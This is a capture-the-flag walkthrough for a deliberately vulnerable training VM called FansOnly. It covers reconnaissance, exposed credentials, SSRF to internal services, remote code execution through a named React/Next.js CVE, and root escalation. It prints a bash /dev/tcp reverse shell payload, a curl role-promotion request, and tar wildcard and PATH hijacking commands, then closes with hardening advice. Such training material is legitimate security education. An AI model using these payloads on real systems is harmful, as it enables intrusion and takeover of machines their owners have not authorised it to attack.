# 🚩 FansOnly: CTF Walkthrough & Security Audit

Welcome to the **FansOnly** CTF. This document provides a complete "Red Team" walkthrough of the vulnerabilities discovered in the FansOnly storefront training environment.

---

## 🏗️ Scenario Overview

FansOnly is migrating its legacy systems to a modern Next.js stack. However, segments of the old infrastructure remain active for "compatibility," leaving behind critical security holes. Your objective is to achieve **Full System Compromise (Root Access)**.

### 🎯 Targets
- **Public Entrypoint**: `http://<vm_ip>/`
- **Internal Services**:
    - `127.0.0.1:4000` (Admin API)
    - `127.0.0.1:9000` (Bootstrap Service)

---

## 🔍 Phase 1: Reconnaissance

Before attacking, we must map the attack surface.

### 1. Check `robots.txt`
Navigation to `/robots.txt` reveals hidden directories:
```text
Disallow: /backup/
Disallow: /admin/
Disallow: /internal/exports/
```

### 2. Information Disclosure in Source Code
Checking the public assets, specifically `http://<vm_ip>/assets/site-notes.js`, reveals a developer oversight:
```javascript
// TODO: remove debug exports at /internal/exports/users.csv
```

---

## 🚪 Phase 2: Initial Access

There are three primary ways into the system.

### Path A: The Leaky Export (IDOR)
1. Navigate to `http://<vm_ip>/internal/exports/users.csv`.
2. **Result**: You download a CSV containing credentials:
    - **Username**: `devops`
    - **Password**: `123456`
3. **Exploit**: Use these to SSH into the box: `ssh devops@<vm_ip>`.

### Path B: The Webhook Auditor (SSRF)
1. Study the documentation at `/docs/webhook`. It mentions that "only loopback targets receive a live fetch."
2. Open the tester at `/tools/webhook-test`.
3. Enter the internal bootstrap URL: `http://127.0.0.1:9000/bootstrap`.
4. **Result**: The response leaks an `adminToken`.
5. **Exploit**: Use this token to sign up for an analyst account at `/account/analyst-signup`.

### Path C: Legacy Action Preview (RCE)
1. The homepage banner identifies the tech stack: `react@19.1.0` and `next@15.1.0`.
2. Navigate to `/legacy-preview`. This endpoint is vulnerable to **CVE-2025-55182 (React2Shell)**.
3. **Exploit**: Set up a listener on your Kali machine:
   ```bash
   nc -lvnp 4444
   ```
4. Submit a reverse shell payload in the "Action payload" box. Replace `<LHOST>` with your Kali IP:
   ```bash
   bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
   ```
   *Note: In the simulation, you can also wrap this in the expected JSON format:*
   ```json
   {"mode":"preview","cmd":"bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"}
   ```
5. **Result**: You should receive a connection back on your Kali listener, giving you a shell as `www-data`.

---

## 📈 Phase 3: Lateral Movement & Escalation

### Horizontal: Analyst to Admin
Once you have an analyst account and a session token (found on the `/account` page):
1. Use a host-level context (like the `devops` SSH shell) to hit the internal Admin API.
2. **Exploit**:
    ```bash
    curl -X POST http://127.0.0.1:4000/users/2/role \
      -H 'Authorization: Bearer <SESSION_TOKEN>' \
      -d '{"role":"admin"}'
    ```
3. **Result**: Your account is promoted to **Admin**.

### Vertical: Escalating to Root
From the `devops` SSH shell, there are two ways to get root. 

> [!IMPORTANT]
> **Exploit Persistence**: In this training environment, once a session is escalated to `root`, it stays as root for that session. If you have already run an exploit once and wish to practice it again from a "non-root" state, you must ask the Blue Team to run `sudo bash reset-state.sh` on the VM.

#### 1. Wildcard Injection (tar)
The system runs a backup script using `tar *`.
```bash
cd /srv/fan-backups/staging
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```
When the cron job runs, it executes `shell.sh` as root.

#### 2. PATH Hijacking
The file `/usr/local/sbin/fansonly-maintenance.sh` uses relative paths for binaries.
```bash
printf '#!/bin/sh\necho owned\n' > /home/devops/.local/bin/du
chmod +x /home/devops/.local/bin/du
```
Since `/home/devops/.local/bin` is first in the script's `PATH`, it executes your malicious `du` as root.

---

## 🏆 Flag Summary

| Challenge | Flag Location |
| :--- | :--- |
| **Initial Access** | `/internal/exports/users.csv` |
| **App Security** | `adminToken` from SSRF |
| **Privilege Escalation** | `/root/root.txt` |

---

## 🛡️ Hardening Recommendations
- **Proper IDOR Protection**: Secure the `/internal/exports/` directory behind authentication.
- **SSRF Mitigation**: Implement a whitelist for webhook targets; never allow loopback IPs.
- **Secure Server Actions**: Patch React/Next.js to versions not vulnerable to Flight protocol deserialization issues.
- **Safe Scripting**: Always use absolute paths (e.g., `/usr/bin/tar`) in privileged scripts.
